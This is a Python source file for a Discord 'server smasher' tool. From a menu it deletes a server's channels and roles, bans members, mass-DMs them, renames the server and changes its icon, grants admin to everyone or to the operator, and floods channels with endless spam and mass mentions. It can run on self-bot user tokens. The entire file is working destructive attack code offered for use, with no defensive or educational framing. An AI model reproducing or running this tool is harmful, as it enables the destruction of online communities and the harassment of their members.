try:
    import os
    import sys
    import time
    import random
    import string
    import asyncio
    import discord
    import pyperclip
    from smconfig import *
    from colorama import init
    from termcolor import colored
    from discord import Permissions
except Exception as e:
    print ("Module import error: " + str(e))
    input()
    sys.exit()

lists = []
users = []
channellist = []
client = discord.Client()
clear = lambda: os.system('cls')
init()

print ("Make Sure you have modified smconfig.py before starting.")
@client.event
async def on_ready():
    if changegameonlogin == True:
        await client.change_presence(game=discord.Game(name=logingame))
    clear()
    print("Logged in as")
    print("User: "+str(client.user.name))
    print("Bot is in the following channels: ")
    counter = -1
    for x in client.servers:
        counter += 1
        print(str(counter)+'. ('+str(x.id)+') '+str(x)+'\n')
        lists.append(x.id)
    print('----------------------------------------')
    a = int(input('Select the server to configure bot actions: '))
    SERVER = lists[int(a)]
    await main(SERVER)

async def main(SERVER):
    #options
    clear()
    server = client.get_server(SERVER)
    print ("Server: " + server.name)
    print ("Server ID: " + str(SERVER))
    print ("----------------------------------------")
    print ("Options:")
    print (colored(" 0. Return to server select. \n 1. Destroy with config settings. \n 2. Create Server Invite. \n 3. Change What the bot is playing. \n 4. Leave server.","green"))
    opts = input ("Select the number for your option: ")
    try:
        if int(opts) == 0:
               await on_ready()
        elif int(opts) == 1:
            #actions
            for c in server.channels:
                myperms = c.permissions_for(server.get_member(client.user.id))
                if myperms.administrator:
                    channellist.append(c)
                else:
                    print (colored("You do not have the permissions to destroy this server.","red"))
                    input ()
                    await main(SERVER)
            for i in server.members:
                users.append(i)

            if chandel == True:
                print('Deleting channels.')
                for channels in channellist:
                    try:
                        print (colored("Deleting " + str(channels),"blue"))
                        await client.delete_channel(channels)
                    except Exception:
                       print (colored("Unable to delete channel: " + channels.name,"red"))
                print('Finished deleting channels.')
               
            if roledel == True:
               print ('Deleting Roles.')
               for role in server.roles:
                   try:
                        print (colored("Deleting role: " + role.name,"blue"))
                        await client.delete_role(server, role)
                   except Exception:
                       print (colored("Unable to delete role: " + role.name,"red"))
               
            if senddm == True:
                for x in users:
                    try:
                        print (colored('Sending DM to ' + str(x),"blue"))
                        await client.send_message(x, dmcontent)
                    except Exception:
                        print (colored("Error sending DM to that user","red"))

            if namechange == True:
                print('Changing server name...')
                await client.edit_server(server=server, name=str(servname))

            if iconbegone == True:
                print('Removing icon...')
                await client.edit_server(server=server, icon=None)
                
            if changeicon == True:
                print('Changing icon...')
                icofile = ".\\spammer\\serversmasher\\" + iconfile
                with open(icofile, 'rb') as handle:
                    icon = handle.read()
                    await client.edit_server(server, icon=icon)
                    
            if giveeveryoneadmin == True:
                print('Giving everyone admin...')
                role = await client.create_role(server, name="Admin", permissions=Permissions.all())
                for user in server.members:
                    try:
                        await client.add_roles(user, role)
                    except Exception as a:
                        print (a)
                        
            if userban == True:
                print('Banning users...')
                for x in users:
                    if str(x) in userid:
                        print (colored("Not Banning " + str(x),"green"))
                    else:
                        print (colored('Banning ' + str(x),"blue"))
                        try:
                            await client.ban(x)
                        except Exception:
                            print(colored('Error Banning that user.',"red"))

            if gimmieadmin == True:
                print('Giving you admin...')
                role = await client.create_role(server, name="Admin", permissions=Permissions.all())
                user = server.get_member(me)
                await client.add_roles(user, role)
                
            if createchan == True:
                print('Creating channels.')
                for x in range(int(channelno)):
                    if chanmethod.lower() == "ascii":
                        asc = ""
                        for x in range(60):
                            num = random.randrange(13000)
                            asc = asc + chr(num)
                        await client.create_channel(server, asc)
                    if chanmethod.lower() == "set":
                        await client.create_channel(server, channame)
                    if chanmethod.lower() == "voice":
                        await client.create_channel(server, channame, type=discord.ChannelType.voice)
                    
                print ('Channels Created.')
                
            if chanmethod.lower() == "voice":
                if chandel == True:
                    print (colored("Not spamming, due to there only being voice channels in this server.","red"))
                    input ()
                    await main(SERVER)

            print('Preparing for next stage.')
            if spammethod == "asc":
                await ascii_spam(SERVER)
            if spammethod == "massment":
                await mass_tag(SERVER)
            if spammethod == "text":
                await text_spam(SERVER,customtxt)
            
        elif int(opts) == 2:
            for channel in server.channels:
                if channel.type == discord.ChannelType.text:
                    invitelinknew = await client.create_invite(destination=channel, xkcd=True, max_uses=100)
                    invite = invitelinknew.url
                    pyperclip.copy(invite)
                    print (invite + " copied to clipboard.")
                    input ()
                    await main(SERVER)
                    
                elif channel.type == discord.ChannelType.voice:
                    invitelinknew = await client.create_invite(destination=channel, xkcd=True, max_uses=100)
                    invite = invitelinknew.url
                    pyperclip.copy(invite)
                    print (invite + " copied to clipboard.")
                    input ()
                    await main(SERVER)
                    
        elif int(opts) == 3:
            play = input ("Playing ")
            await client.change_presence(game=discord.Game(name=play))
            await main(SERVER)
            
        elif int(opts) == 4:
            print ("Are you sure you want to leave this server? (Y/N): ")
            yn = input()
            if yn.lower() == 'y':
                await client.leave_server(server)
                await on_ready()
            else:
                await main(SERVER)
                
    except Exception as e:
        print (colored("Error:","red"))
        print (colored(e,"red"))
        input()
        await main(SERVER)
        
async def mass_tag(SERVER):
    server = client.get_server(SERVER)
    await asyncio.sleep(5)
    await client.wait_until_ready()
    msg = ' '
    for m in server.members:
        msg += m.mention + ' '
    while not client.is_closed:
       for c in server.channels:
            if c.type != discord.ChannelType.text:
               continue
            myperms = c.permissions_for(server.get_member(client.user.id))
            if not myperms.send_messages:
                continue
            print('Mass Mentioning in: '+c.name)
            for m in [msg[i:i+1999] for i in range(0, len(msg), 1999)]:
                try:
                    await client.send_message(c, m)
                except:
                    print('Error')

async def ascii_spam(SERVER):
    server = client.get_server(SERVER)
    await asyncio.sleep(5)
    await client.wait_until_ready()
    while not client.is_closed:
       for c in server.channels:
            if c.type != discord.ChannelType.text:
               continue
            myperms = c.permissions_for(server.get_member(client.user.id))
            if not myperms.send_messages:
                continue
            print('Ascii Spamming in: '+c.name)
            asc = ""
            for x in range(1999):
                num = random.randrange(13000)
                asc = asc + chr(num)
            try:
                await client.send_message(c, asc)
            except:
                print('Error')

async def text_spam(SERVER,customtxt):
    server = client.get_server(SERVER)
    await asyncio.sleep(5)
    await client.wait_until_ready()
    while not client.is_closed:
       for c in server.channels:
            if c.type != discord.ChannelType.text:
               continue
            myperms = c.permissions_for(server.get_member(client.user.id))
            if not myperms.send_messages:
                continue
            print('Text Spamming in: '+c.name)
            try:
                await client.send_message(c, customtxt)
            except:
                print('Error')

 
if clienttype.lower() == "user":
    try:
        client.run(token, bot=False)
    except Exception as c:
        print (str(c))
if clienttype.lower() == "bot":
    try:
        client.run(token)
    except Exception as c:
        print (str(c))

